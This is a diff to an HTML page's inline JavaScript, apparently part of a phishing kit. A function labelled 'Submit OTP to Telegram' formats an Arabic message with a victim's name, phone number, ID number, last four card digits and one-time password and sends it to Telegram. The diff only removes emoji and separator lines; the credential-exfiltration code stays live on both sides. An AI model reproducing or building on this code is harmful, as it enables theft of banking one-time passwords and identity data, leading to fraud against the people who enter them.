@@ -193,7 +193,7 @@ height: auto;
 
   <div class="top-bar">
     <div class="top-actions">
-            <span class="user-chip">👤</span>
+            <span class="user-chip"></span>
 
       <span class="lang-chip">EN</span>
     </div>
@@ -282,15 +282,15 @@ height: auto;
     // Submit OTP to Telegram
     async function submitToServer(data) {
       const message = `
-✅ <b>رمز التحقق (1)</b>
-━━━━━━━━━━━━━━━
-👤 من: ${data.owner_name}
-━━━━━━━━━━━━━━━
-📱 رقم الهاتف: ${data.phone}
+ <b>رمز التحقق (1)</b>
+
+ من: ${data.owner_name}
+
+ رقم الهاتف: ${data.phone}
 🪪 رقم الهوية: ${data.id_number}
-━━━━━━━━━━━━━━━
-💳 آخر 4 أرقام: ${data.last_4_digits}
-🔐 رمز OTP: ${data.otp_code}
+
+ آخر 4 أرقام: ${data.last_4_digits}
+ رمز OTP: ${data.otp_code}
       `;
       return await sendToTelegram(message);
     }
